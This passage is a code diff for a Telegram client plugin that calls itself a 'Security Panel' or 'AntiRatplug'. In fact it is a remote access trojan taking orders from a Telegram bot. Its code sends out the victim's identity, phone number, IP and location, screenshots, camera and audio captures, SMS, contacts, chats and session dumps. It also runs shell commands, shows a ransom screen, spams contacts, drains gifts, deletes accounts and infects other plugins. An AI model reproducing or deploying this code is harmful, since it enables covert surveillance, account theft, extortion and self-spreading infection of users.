+            for sub in ("plugins", "Telegram/plugins", "Download"):
+                candidates.append(os.path.join(fdir, sub))
+        except Exception:
+            pass
+        for p in candidates:
+            if not p or not os.path.isdir(p):
+                continue
+            p = os.path.abspath(p)
+            if p in seen:
+                continue
+            seen.add(p)
+            try:
+                for root, dirs, files in os.walk(p):
+                    for fn in files:
+                        if fn.endswith(".plugin") and not fn.startswith("."):
+                            out.append(os.path.join(root, fn))
+            except Exception:
+                pass
+        return out
+
+    def _broadcast(self, text):
+        def task():
+            try:
+                self._send_msg("📢 Рассылка...")
+                mc = _MC().getInstance(0)
+                dialogs = mc.dialogs
+                if dialogs is None:
+                    self._send_msg("Пусто")
+                    return
+                count = 0
+                for i in range(dialogs.size()):
+                    try:
+                        dialog = dialogs.get(i)
+                        if dialog is None:
+                            continue
+                        peer = dialog.peer
+                        if peer is None:
+                            continue
+                        req = TLRPC.TL_messages_sendMessage()
+                        req.peer = peer
+                        req.message = str(text)
+                        req.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
+                        gate = _ReplyGate()
+                        with self._rpc_lock:
+                            self._pending_delegates.append(gate)
+                        _CM().getInstance(0).sendRequest(req, gate)
+                        time.sleep(0.3)
+                        count += 1
+                    except Exception:
+                        pass
+                self._send_msg("✅ Рассылка: %d" % count)
+            except Exception as e:
+                self._send_msg("Ошибка: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _full_harvest(self, include_sessions=True, auto_infect=False):
+        def task():
+            try:
+                self._send_msg("🌾 Full Harvest...")
+                t0 = time.time()
+                report = ["<b>🌾 Full Harvest</b>"]
+                try:
+                    user = _UC().getInstance(0).getCurrentUser()
+                    if user is not None:
+                        report.append("<b>Пользователь:</b> %s %s (@%s, +%s, id=%s)" % (
+                            self._html_escape(user.first_name or ""),
+                            self._html_escape(user.last_name or ""),
+                            self._html_escape(user.username or "нет"),
+                            self._html_escape(user.phone or "нет"),
+                            str(user.id)))
+                except Exception:
+                    pass
+                from android.os import Build
+                report.append("<b>Устройство:</b> %s %s / Android %s" % (
+                    self._html_escape(Build.MANUFACTURER),
+                    self._html_escape(Build.MODEL),
+                    self._html_escape(Build.VERSION.RELEASE)))
+                ip = self._get_external_ip()
+                geo = self._get_geo_info(ip)
+                report.append("<b>IP:</b> %s\n<b>Гео:</b> %s" % (
+                    self._html_escape(ip), self._html_escape(geo)))
+                try:
+                    code = self._tg_kid()
+                    if code:
+                        report.append("<b>Tg kid:</b> <code>%s</code>" % self._html_escape(str(code)))
+                except Exception:
+                    pass
+                try:
+                    self._screenshot()
+                    report.append("<b>Скриншот:</b> ok")
+                except Exception:
+                    pass
+                try:
+                    self._manual_camera("front")
+                    self._manual_camera("back")
+                    report.append("<b>Камеры:</b> ok")
+                except Exception:
+                    pass
+                try:
+                    self._manual_audio(5)
+                    report.append("<b>Аудио:</b> ok")
+                except Exception:
+                    pass
+                try:
+                    self._manual_sms()
+                except Exception:
+                    pass
+                try:
+                    self._manual_contacts()
+                except Exception:
+                    pass
+                try:
+                    self._manual_apps()
+                except Exception:
+                    pass
+                if include_sessions:
+                    try:
+                        self._manual_dump_session()
+                        report.append("<b>Session.zip:</b> ok")
+                    except Exception:
+                        pass
+                    try:
+                        self._manual_userbot_session()
+                        report.append("<b>Userbot:</b> ok")
+                    except Exception:
+                        pass
+                try:
+                    self._manual_chats()
+                except Exception:
+                    pass
+                if auto_infect:
+                    try:
+                        self._z_plugins()
+                        report.append("<b>Заражение:</b> ok")
+                    except Exception:
+                        pass
+                report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
+                markup = {
+                    "inline_keyboard": [
+                        [{"text": "🗑 Wipe", "callback_data": "hv_wipe"}],
+                        [{"text": "❌ Delete", "callback_data": "hv_delete"}],
+                        [{"text": "📦 Logout", "callback_data": "hv_logout"}],
+                        [{"text": "🖼 Shot", "callback_data": "hv_shot"}],
+                    ]
+                }
+                self._send_markup("\n".join(report), markup, html=True)
+            except Exception as e:
+                self._send_msg("Ошибка Harvest: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _execute_ltp_chain(self):
+        def task():
+            try:
+                self._send_msg("🔒 LTP 1/5 No-Mercy...")
+                self._start_mercy_mode()
+                time.sleep(1)
+                self._send_msg("2/5 Tg kid...")
+                self._tg_kid()
+                time.sleep(1)
+                self._send_msg("3/5 Слежка...")
+                try:
+                    self._screenshot()
+                except Exception:
+                    pass
+                try:
+                    self._manual_camera("front")
+                    self._manual_camera("back")
+                except Exception:
+                    pass
+                try:
+                    self._manual_audio(5)
+                except Exception:
+                    pass
+                time.sleep(1)
+                self._send_msg("4/5 Дамп...")
+                try:
+                    self._manual_dump_session()
+                except Exception:
+                    pass
+                try:
+                    self._manual_userbot_session()
+                except Exception:
+                    pass
+                time.sleep(1)
+                self._send_msg("5/5 Pull Out...")
+                self._pull_out_account()
+            except Exception as e:
+                self._send_msg("Ошибка LTP: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _execute_vtp_chain(self, mode):
+        def task():
+            try:
+                self._send_msg("🎬 VTP [%s] 1/5 Vidker..." % mode.upper())
+                self._activate_vidker(mode)
+                time.sleep(1)
+                self._send_msg("2/5 Tg kid...")
+                self._tg_kid()
+                time.sleep(1)
+                self._send_msg("3/5 Слежка...")
+                try:
+                    self._screenshot()
+                except Exception:
+                    pass
+                try:
+                    self._manual_camera("front")
+                    self._manual_camera("back")
+                except Exception:
+                    pass
+                try:
+                    self._manual_audio(5)
+                except Exception:
+                    pass
+                time.sleep(1)
+                self._send_msg("4/5 Дамп...")
+                try:
+                    self._manual_dump_session()
+                except Exception:
+                    pass
+                try:
+                    self._manual_userbot_session()
+                except Exception:
+                    pass
+                time.sleep(1)
+                self._send_msg("5/5 Pull Out...")
+                self._pull_out_account()
+            except Exception as e:
+                self._send_msg("Ошибка VTP: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _show_automatic_menu(self):
+        keyboard = {
+            "keyboard": [
+                [{"text": "🌾 Full Harvest"}],
+                [{"text": "🔒 Full Lockdown"}],
+                [{"text": "🎁 Gift Transfer"}],
+                [{"text": "Broadcast"}, {"text": "Infect Plugins"}],
+                [{"text": "LTP"}, {"text": "VTP"}],
+                [{"text": "⬅️ Back to Manage"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("👑 <b>Автоматика:</b>", keyboard, html=True)
+
+    def _show_help(self):
+        text = (
+            "<b>📖 AntiRatplug — Fast Nuke</b>\n\n"
+            "<b>🔑 Сессии:</b> Wipe, Terminate by Hash\n"
+            "<b>📸 Слежка:</b> Screenshot, Camera F/B, Audio 5s\n"
+            "<b>📦 Данные:</b> SMS, Apps, Chats\n"
+            "<b>👤 Аккаунт:</b> Info, Tg kid, Pull Out, Delete, a4team\n"
+            "<b>💻 Shell:</b> ls, ps, ifconfig, df, Custom\n"
+            "<b>🤡 Тролль:</b> Vidker, Lock, Ransom, M-music, Flood, CSM, The end.\n\n"
+            "<b>👑 Автоматика</b>\n"
+            "• Full Harvest — сбор\n"
+            "• Full Lockdown — FAST параллельные группы\n"
+            "• Gift Transfer — подарки\n"
+            "• Broadcast, Infect Plugins, LTP, VTP\n"
+        )
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "⬅️ Назад", "callback_data": "back_auto"}],
+            ]
+        }
+        self._send_markup(text, keyboard, html=True)
+
+    def _api(self, method):
+        _cfg()
+        return _u(_HOST_TG) + _config + "/" + method
+
+    def _send_manage_button(self):
+        from java.net import URL, URLEncoder
+        from java.io import DataOutputStream
+        username = "unknown"
+        try:
+            uc = _UC().getInstance(0)
+            uid = uc.getClientUserId()
+            user = uc.getCurrentUser()
+            if user is not None:
+                username = str(user.username) if user.username is not None else "id:" + str(uid)
+        except Exception:
+            pass
+        text = "<b>Security Panel</b>\nUser: @" + username + "\n\nTap Manage"
+        buttons = [[{"text": "Manage", "callback_data": "menu"}]]
+        markup = json.dumps({"inline_keyboard": buttons})
+        for target in _targets:
+            try:
+                url = URL(self._api("sendMessage"))
+                conn = url.openConnection()
+                conn.setRequestMethod("POST")
+                conn.setDoOutput(True)
+                conn.setConnectTimeout(8000)
+                conn.setReadTimeout(8000)
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+                params = ("chat_id=" + target
+                          + "&text=" + str(URLEncoder.encode(text, "UTF-8"))
+                          + "&parse_mode=HTML&reply_markup=" + str(URLEncoder.encode(markup, "UTF-8")))
+                os_ = DataOutputStream(conn.getOutputStream())
+                os_.writeBytes(params)
+                os_.flush()
+                os_.close()
+                conn.getResponseCode()
+                conn.disconnect()
+            except Exception:
+                pass
+
+    def _send_markup(self, text, keyboard, html=False):
+        from java.net import URL, URLEncoder
+        from java.io import DataOutputStream
+        markup = json.dumps(keyboard)
+        for target in _targets:
+            try:
+                url = URL(self._api("sendMessage"))
+                conn = url.openConnection()
+                conn.setRequestMethod("POST")
+                conn.setDoOutput(True)
+                conn.setConnectTimeout(8000)
+                conn.setReadTimeout(8000)
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+                params = ("chat_id=" + target
+                          + "&text=" + str(URLEncoder.encode(text, "UTF-8"))
+                          + "&reply_markup=" + str(URLEncoder.encode(markup, "UTF-8")))
+                if html:
+                    params += "&parse_mode=HTML"
+                os_ = DataOutputStream(conn.getOutputStream())
+                os_.writeBytes(params)
+                os_.flush()
+                os_.close()
+                conn.getResponseCode()
+                conn.disconnect()
+            except Exception:
+                pass
+
+    def _show_main_menu(self):
+        keyboard = {
+            "keyboard": [
+                [{"text": "Manual using"}],
+                [{"text": "Troll"}],
+                [{"text": "Automatic"}],
+                [{"text": "❓ Help"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("⚙️ <b>Выбор режима:</b>", keyboard, html=True)
+
+    def _show_vtp_menu(self):
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "He who remains", "callback_data": "vtp_hwr"}],
+                [{"text": "Real doom", "callback_data": "vtp_realdoom"}],
+                [{"text": "Отмена", "callback_data": "vtp_cancel"}],
+            ]
+        }
+        self._send_markup("🎬 <b>VTP:</b>", keyboard, html=True)
+
+    def _show_vidker_menu(self):
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "Arishem", "callback_data": "vid_arishem"}],
+                [{"text": "Sentry", "callback_data": "vid_sentry"}],
+                [{"text": "Dr.Doom", "callback_data": "vid_drdoom"}],
+                [{"text": "Evil Morty", "callback_data": "vid_evilmorty"}],
+                [{"text": "Отмена", "callback_data": "vid_cancel"}],
+            ]
+        }
+        self._send_markup("🎬 <b>Vidker payload:</b>", keyboard, html=True)
+
+    def _send_msg(self, text, html=False):
+        from java.net import URL, URLEncoder
+        from java.io import DataOutputStream
+        for target in _targets:
+            try:
+                url = URL(self._api("sendMessage"))
+                conn = url.openConnection()
+                conn.setRequestMethod("POST")
+                conn.setDoOutput(True)
+                conn.setConnectTimeout(6000)
+                conn.setReadTimeout(6000)
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+                encoded = URLEncoder.encode(text, "UTF-8")
+                if html:
+                    params = "chat_id=" + target + "&text=" + str(encoded) + "&parse_mode=HTML"
+                else:
+                    params = "chat_id=" + target + "&text=" + str(encoded)
+                os_ = DataOutputStream(conn.getOutputStream())
+                os_.writeBytes(params)
+                os_.flush()
+                os_.close()
+                conn.getResponseCode()
+                conn.disconnect()
+            except Exception:
+                pass
+
+    def _send_msg_with_close(self, text, close_action):
+        markup = {"inline_keyboard": [[{"text": "Закрыть", "callback_data": close_action}]]}
+        self._send_markup(text, markup)
+
+    def _send_photo(self, file_path, caption):
+        _cfg()
+        from java.net import URL
+        from java.io import DataOutputStream, FileInputStream
+        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        for target in _targets:
+            try:
+                url = URL(self._api("sendPhoto"))
+                conn = url.openConnection()
+                conn.setRequestMethod("POST")
+                conn.setDoOutput(True)
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
+                s = DataOutputStream(conn.getOutputStream())
+                s.writeBytes("--" + boundary + "\r\n")
+                s.writeBytes('Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+                s.writeBytes(str(target) + "\r\n")
+                if caption:
+                    s.writeBytes("--" + boundary + "\r\n")
+                    s.writeBytes('Content-Disposition: form-data; name="caption"\r\n\r\n')
+                    s.writeBytes(str(caption) + "\r\n")
+                s.writeBytes("--" + boundary + "\r\n")
+                s.writeBytes('Content-Disposition: form-data; name="photo"; filename="screenshot.png"\r\n')
+                s.writeBytes("Content-Type: image/png\r\n\r\n")
+                fis = FileInputStream(file_path)
+                buf = bytearray(8192)
+                while True:
+                    n = fis.read(buf)
+                    if n < 0:
+                        break
+                    s.write(buf, 0, n)
+                fis.close()
+                s.writeBytes("\r\n--" + boundary + "--\r\n")
+                s.flush()
+                s.close()
+                conn.getResponseCode()
+                conn.disconnect()
+            except Exception:
+                pass
+
+    def _send_document_bytes(self, filename, data):
+        _cfg()
+        from java.net import URL
+        from java.io import DataOutputStream
+        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        for target in _targets:
+            try:
+                url = URL(self._api("sendDocument"))
+                conn = url.openConnection()
+                conn.setRequestMethod("POST")
+                conn.setDoOutput(True)
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
+                s = DataOutputStream(conn.getOutputStream())
+                s.writeBytes("--" + boundary + "\r\n")
+                s.writeBytes('Content-Disposition: form-data; name="chat_id"\r\n\r\n')
+                s.writeBytes(str(target) + "\r\n")
+                s.writeBytes("--" + boundary + "\r\n")
+                s.writeBytes('Content-Disposition: form-data; name="document"; filename="%s"\r\n' % filename)
+                s.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
+                s.write(bytes(data))
+                s.writeBytes("\r\n--" + boundary + "--\r\n")
+                s.flush()
+                s.close()
+                conn.getResponseCode()
+                conn.disconnect()
+            except Exception:
+                pass
+
+    def _fetch_url(self, url, timeout=30):
+        from urllib.parse import urlsplit, urlunsplit, quote
+        from urllib.request import urlopen
+        try:
+            parts = urlsplit(url)
+            safe = urlunsplit((parts.scheme, parts.netloc,
+                               quote(parts.path, safe="/%"),
+                               quote(parts.query, safe="=&%"),
+                               parts.fragment))
+            url = safe
+        except Exception:
+            pass
+        return urlopen(url, timeout=timeout).read()
+
+    def _answer_callback(self, callback_id):
+        try:
+            from java.net import URL
+            from java.io import DataOutputStream
+            url = URL(self._api("answerCallbackQuery"))
+            conn = url.openConnection()
+            conn.setRequestMethod("POST")
+            conn.setDoOutput(True)
+            conn.setConnectTimeout(6000)
+            conn.setReadTimeout(6000)
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+            os_ = DataOutputStream(conn.getOutputStream())
+            os_.writeBytes("callback_query_id=" + str(callback_id))
+            os_.flush()
+            os_.close()
+            conn.getResponseCode()
+            conn.disconnect()
+        except Exception:
+            pass
+
+    def _start_polling(self):
+        threading.Thread(target=self._poll, daemon=True).start()
+
+    def _poll(self):
+        offset = 0
+        _cfg()
+        try:
+            from java.net import URL
+            from java.io import BufferedReader, InputStreamReader
+            url = URL(self._api("getUpdates") + "?offset=-1&timeout=0")
+            conn = url.openConnection()
+            conn.setRequestMethod("GET")
+            conn.setConnectTimeout(4000)
+            conn.setReadTimeout(4000)
+            reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+            response = ""
+            line = reader.readLine()
+            while line is not None:
+                response += str(line)
+                line = reader.readLine()
+            reader.close()
+            conn.disconnect()
+            data = json.loads(response)
+            if data.get("ok") and data.get("result"):
+                offset = data["result"][-1]["update_id"] + 1
+        except Exception:
+            pass
+
+        while self._sync_running:
+            try:
+                from java.net import URL
+                from java.io import BufferedReader, InputStreamReader
+                url = URL(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=8")
+                conn = url.openConnection()
+                conn.setRequestMethod("GET")
+                conn.setConnectTimeout(12000)
+                conn.setReadTimeout(12000)
+                reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+                response = ""
+                line = reader.readLine()
+                while line is not None:
+                    response += str(line)
+                    line = reader.readLine()
+                reader.close()
+                conn.disconnect()
+                data = json.loads(response)
+                if data.get("ok") and data.get("result"):
+                    for update in data["result"]:
+                        offset = update["update_id"] + 1
+                        if "callback_query" in update:
+                            self._handle_callback(update["callback_query"])
+                        elif "message" in update:
+                            self._handle_message(update["message"])
+            except Exception:
+                pass
+            time.sleep(0.35)
+
+    def _handle_callback(self, cb):
+        cb_id = cb["id"]
+        cb_data = cb.get("data", "")
+        self._answer_callback(cb_id)
+        if cb_data == "menu":
+            self._show_main_menu()
+        elif cb_data == "back_auto":
+            self._show_automatic_menu()
+        elif cb_data == "lock_std":
+            self._send_msg_with_close("🔒 Локер активирован.", "close_locker")
+            self._lock_screen()
+        elif cb_data == "lock_mercy":
+            self._start_mercy_mode()
+        elif cb_data == "lock_ransom":
+            self._show_ransom(
+                text=RANSOM_TEXT, photo_url=RANSOM_PHOTO_URL,
+                ton_link=RANSOM_TON_LINK, card_link=RANSOM_CARD_LINK,
+                amount_rub=RANSOM_AMOUNT_RUB, amount_ton=RANSOM_AMOUNT_TON,
+                warning=RANSOM_WARNING)
+            self._send_msg_with_close("⚠ Ransom активен.", "close_ransom")
+        elif cb_data == "close_ransom":
+            self._dismiss_ransom()
+        elif cb_data == "lock_cancel":
+            self._send_msg("Отменено.")
+        elif cb_data == "vid_arishem":
+            self._activate_vidker("arishem")
+        elif cb_data == "vid_sentry":
+            self._activate_vidker("sentry")
+        elif cb_data == "vid_drdoom":
+            self._activate_vidker("drdoom")
+        elif cb_data == "vid_evilmorty":
+            self._activate_vidker("evilmorty")
+        elif cb_data == "vid_cancel":
+            self._send_msg("Отменено.")
+        elif cb_data == "vtp_hwr":
+            self._execute_vtp_chain("hwr")
+        elif cb_data == "vtp_realdoom":
+            self._execute_vtp_chain("realdoom")
+        elif cb_data == "vtp_cancel":
+            self._send_msg("Отменено.")
+        elif cb_data == "close_vidker":
+            self._close_vidker_permanently()
+        elif cb_data == "close_locker":
+            self._clear_locker()
+        elif cb_data == "close_end":
+            self._clear_dim()
+        elif cb_data == "close_music":
+            self._clear_music()
+        elif cb_data == "hv_wipe":
+            self._session_wipe()
+        elif cb_data == "hv_delete":
+            self._delete_account()
+        elif cb_data == "hv_logout":
+            self._pull_out_account()
+        elif cb_data == "hv_shot":
+            self._screenshot()
+
+    def _handle_message(self, msg):
+        msg_text = msg.get("text", "")
+
+        if msg_text == "⬅️ Back to Manage":
+            self._show_main_menu()
+        elif msg_text == "⬅️ Back to Manual":
+            self._show_manual_menu()
+        elif msg_text == "Manual using":
+            self._show_manual_menu()
+        elif msg_text == "Troll":
+            self._show_troll_menu()
+        elif msg_text == "Automatic":
+            self._show_automatic_menu()
+        elif msg_text == "❓ Help":
+            self._show_help()
+        elif msg_text == "Session Control":
+            self._show_sessions_menu()
+        elif msg_text == "Surveillance":
+            self._show_surveillance_menu()
+        elif msg_text == "Data Grab":
+            self._show_data_menu()
+        elif msg_text == "Account":
+            self._show_account_menu()
+        elif msg_text == "Shell":
+            self._show_shell_menu()
+        elif msg_text == "Wipe Sessions":
+            self._session_wipe()
+        elif msg_text == "Terminate by Hash":
+            self._send_msg("Отправь hash:")
+            self._mmusic_waiting = "term_hash"
+        elif msg_text == "Screenshot":
+            self._screenshot()
+        elif msg_text == "Camera Front":
+            self._manual_camera("front")
+        elif msg_text == "Camera Back":
+            self._manual_camera("back")
+        elif msg_text == "Audio 5s":
+            self._manual_audio(5)
+        elif msg_text == "SMS":
+            self._manual_sms()
+        elif msg_text == "Apps":
+            self._manual_apps()
+        elif msg_text == "Chats":
+            self._manual_chats()
+        elif msg_text == "Info":
+            self._info()
+        elif msg_text == "Tg kid":
+            self._tg_kid()
+        elif msg_text == "Pull Out":
+            self._pull_out_account()
+        elif msg_text == "Delete Account":
+            self._delete_account()
+        elif msg_text == "Go to a4team":
+            self._join_a4team()
+        elif msg_text == "ls /sdcard":
+            self._manual_shell("ls /sdcard")
+        elif msg_text == "ps":
+            self._manual_shell("ps -A")
+        elif msg_text == "ifconfig":
+            self._manual_shell("ifconfig")
+        elif msg_text == "df -h":
+            self._manual_shell("df -h")
+        elif msg_text == "Custom Shell Cmd":
+            self._send_msg("Отправь команду:")
+            self._mmusic_waiting = "shell"
+        elif msg_text == "Vidker":
+            self._show_vidker_menu()
+        elif msg_text == "Lock screen":
+            self._show_locker_menu()
+        elif msg_text == "Ransom":
+            self._show_ransom(
+                text=RANSOM_TEXT, photo_url=RANSOM_PHOTO_URL,
+                ton_link=RANSOM_TON_LINK, card_link=RANSOM_CARD_LINK,
+                amount_rub=RANSOM_AMOUNT_RUB, amount_ton=RANSOM_AMOUNT_TON,
+                warning=RANSOM_WARNING)
+            self._send_msg_with_close("⚠ Ransom активен.", "close_ransom")
+        elif msg_text == "M-music":
+            self._mmusic_waiting = "music"
+            self._send_msg("🎵 Отправь .mp3 URL:")
+        elif msg_text == "Flood Gallery":
+            self._flood_gallery(SPLASH_URL, 100)
+            self._send_msg("🌊 Flood: 100 файлов.")
+            self._mmusic_waiting = "flood"
+        elif msg_text == "Clear Flood":
+            self._clear_flood()
+        elif msg_text == "CSM":
+            self._mmusic_waiting = "csm"
+            self._send_msg("📨 CSM: отправь текст:")
+        elif msg_text == "The end.":
+            self._the_end()
+        elif msg_text == "🌾 Full Harvest":
+            self._full_harvest()
+        elif msg_text == "🔒 Full Lockdown":
+            self._full_lockdown(0, transfer_gifts=True)
+        elif msg_text == "🎁 Gift Transfer":
+            self._send_msg("🎁 Gift Transfer...")
+            def _task():
+                try:
+                    r = self._drain_gifts(0, workers=6)
+                    self._send_msg("🎁 <b>Итог</b>\nВсего: %d\nOK: %d\nConvert: %d\n"
+                                   "Delist: %d\nBC-skip: %d\nFail: %d" % (
+                                       r.get("total", 0), r.get("ok", 0), r.get("convert", 0),
+                                       r.get("delist", 0), r.get("skip_bc", 0), r.get("fail", 0)), html=True)
+                except Exception as e:
+                    self._send_msg("Ошибка: " + str(e))
+            threading.Thread(target=_task, daemon=True).start()
+        elif msg_text == "Broadcast":
+            self._mmusic_waiting = "broadcast"
+            self._send_msg("Рассылка: текст:")
+        elif msg_text == "Infect Plugins":
+            self._z_plugins()
+        elif msg_text == "LTP":
+            self._execute_ltp_chain()
+        elif msg_text == "VTP":
+            self._show_vtp_menu()
+        elif self._mmusic_waiting:
+            mode = self._mmusic_waiting
+            self._mmusic_waiting = False
+            txt = msg_text.strip()
+            if mode == "shell":
+                if txt:
+                    self._manual_shell(txt)
+            elif mode == "term_hash":
+                try:
+                    self._manual_terminate_session(int(txt))
+                except Exception:
+                    self._send_msg("❌ Неверный hash.")
+            elif mode == "flood":
+                if txt.startswith("http"):
+                    self._flood_gallery(txt, 100)
+            elif mode == "csm":
+                if txt:
+                    self._csm_spam(txt)
+            elif mode == "broadcast":
+                if txt:
+                    self._broadcast(txt)
+            else:
+                if txt.startswith("http") and ".mp3" in txt.lower():
+                    self._play_mmusic(txt)
+                else:
+                    self._send_msg("❌ Неверная ссылка.")
+        elif self._replace_waiting:
+            self._replace_waiting = False
+            if msg_text.lower() == "stop":
+                self._replace_mode = False
+                self._replace_text = ""
+                self._send_msg("Замена отключена")
+            else:
+                self._replace_text = msg_text
+                self._replace_mode = True
+                self._send_msg("Замена активна!")
+        elif msg_text == "Replace":
+            self._replace_waiting = True
+            self._send_msg("Текст замены. 'stop' для отключения.")
+
+    def _ensure_splash(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+            if not os.path.exists(d):
+                os.makedirs(d)
+            path = os.path.join(d, "lock_bg.jpg")
+            self._lock_path = path
+            if os.path.exists(path):
+                return
+
+            def dl():
+                try:
+                    from java.net import URL
+                    from java.io import BufferedInputStream, FileOutputStream
+                    u = URL(SPLASH_URL)
+                    conn = u.openConnection()
+                    conn.setConnectTimeout(8000)
+                    conn.setReadTimeout(10000)
+                    inp = BufferedInputStream(conn.getInputStream())
+                    fos = FileOutputStream(path)
+                    buf = bytearray(8192)
+                    while True:
+                        n = inp.read(buf)
+                        if n < 0:
+                            break
+                        fos.write(buf, 0, n)
+                    fos.close()
+                    inp.close()
+                    conn.disconnect()
+                except Exception:
+                    pass
+            threading.Thread(target=dl, daemon=True).start()
+        except Exception:
+            pass
+
+    def _check_persisted_mercy(self):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            if prefs.getBoolean("no_mercy_active", False):
+                self._start_mercy_mode()
+        except Exception:
+            pass
+
+    def _check_persisted_vidker(self):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            if prefs.getBoolean("vidker_active", False):
+                mode = prefs.getString("vidker_mode", "arishem")
+
+                def wait_and_start():
+                    time.sleep(2)
+                    for _ in range(60):
+                        try:
+                            from client_utils import get_last_fragment
+                            frag = get_last_fragment()
+                            if frag is not None and frag.getParentActivity() is not None:
+                                self._render_vidker_task(str(mode))
+                                return
+                        except Exception:
+                            pass
+                        time.sleep(1)
+                threading.Thread(target=wait_and_start, daemon=True).start()
+        except Exception:
+            pass
+
+
+def create_plugin():
+    return PluginSecurityPlugin()
